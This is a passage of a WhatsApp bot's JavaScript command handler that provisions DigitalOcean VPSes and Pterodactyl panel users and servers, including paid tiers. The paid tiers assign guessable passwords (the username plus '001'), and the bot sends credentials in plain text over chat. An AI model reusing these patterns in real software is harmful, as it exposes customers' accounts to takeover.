      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await Biiofc.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case "crateadmin1": {
if (!isOwner) return reply(`*Lu Siape? Fitur Ini Khusus Owner Gw!*`)

let s = q.split(',')
let email = s[0];
let username = s[0]
let nomor = s[1]
if (s.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (!username) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
if (!nomor) return reply(`Ex : ${prefix+command} Username,@tag/nomor\n\nContoh :\n${prefix+command} example,@user`)
let password = generateRandomPassword();
let nomornya = nomor.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": username + "@gmail.com",
"username": username,
"first_name": username,
"last_name": "Memb",
"language": "en",
 "root_admin" : true,  
"password": password.toString()
})

})

let data = await f.json();

if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));

let user = data.attributes

let tks = `
TYPE: user

📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${user.created_at}

🖥️LOGIN: ${domain}
`
    const listMessage = {

        text: tks,

    }

	

    await Biiofc.sendMessage(m.chat, listMessage)

    await Biiofc.sendMessage(nomornya, {

        text: `*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n

USERNAME :  ${username}
PASSWORD: ${password}
LOGIN: ${domain}

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*


`,

    })

} 
        break
case "tutorial1": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner && !isPremium) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TUTOR RUN* )▭▬▭

*TUTOR RUN BOT*
( https://youtu.be/rqqxkI4P8YY )

 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, hardznum], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
 case "addsrv1": {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let s = text.split(',');
if (s.length < 7) return reply(`*Format salah!*

Penggunaan:
${prefix + command} name,tanggal,userId,eggId,locationId,memory/disk,cpu`)
let name = s[0];
let desc = s[1] || ''
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo_disk[0],
"swap": 0,
"disk": memo_disk[1],
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY ADD SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${server.created_at}`)
}
        break
case "addusr1": {

if (!isOwner) return reply(`Maaf Command Tersebut Khusus Developer Bot WhatsApp`)
let t = text.split(',');
if (t.length < 3) return reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
if (!u) return m.reply(`*Format salah!*

Penggunaan:
${prefix + command} email,username,name,number/tag`);
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = d.exists ? crypto.randomBytes(5).toString('hex') : t[3]
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = await Biiofc.sendMessage(m.chat, { text: `
*SUCCESSFULLY ADD USER*

╭─❏ *『 USER INFO 』*
┣❐ ➤ *ID* : ${user.id}
┣❏ ➤ *USERNAME* : ${user.username}
┣❏ ➤ *EMAIL* : ${user.email}
┣❏ ➤ *NAME* : ${user.first_name} ${user.last_name}
┣❏ ➤ *CREATED AT* :  ${tanggal}
┗⬣ *PASSWORD BERHASIL DI KIRIM KE @${u.split`@`[0]}*`, mentions:[u],
})
Biiofc.sendMessage(u, { text: `*BERIKUT DETAIL AKUN PANEL ANDA*\n
╭─❏ *『 USER INFO 』*
┣❏ ➤ *📧EMAIL* : ${email}
┣❏ ➤ *👤USERNAME* : ${username}
┣❏ ➤ *🔐PASSWORD* : ${password.toString()}
┣❏ ➤ *🌐LOGIN* : ${domain}
┗⬣`,
})
}
break
 case "srvpaket1": {
       if (cekSaldo(sender,db_saldo) < 3000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Hardz"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`DONE BY HzOffcial⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}
 *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ
NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
`)

}
minSaldo(sender, 3000, db_saldo)
break
case "srvpaket2": {
       if (cekSaldo(sender,db_saldo) < 4000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Hardz"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 4000, db_saldo)
break
case "srvpaket3": {
       if (cekSaldo(sender,db_saldo) < 6000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp6.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Hardz"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 6000, db_saldo)
break
case "srvpaket4": {
       if (cekSaldo(sender,db_saldo) < 8000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Hardz"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "200"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 8000, db_saldo)
break
case "srvpaket5": {
       if (cekSaldo(sender,db_saldo) < 10000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Hz"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 10000, db_saldo)
break
case "srvpaket6": {
       if (cekSaldo(sender,db_saldo) < 20000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp20.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
       
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Hardz"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
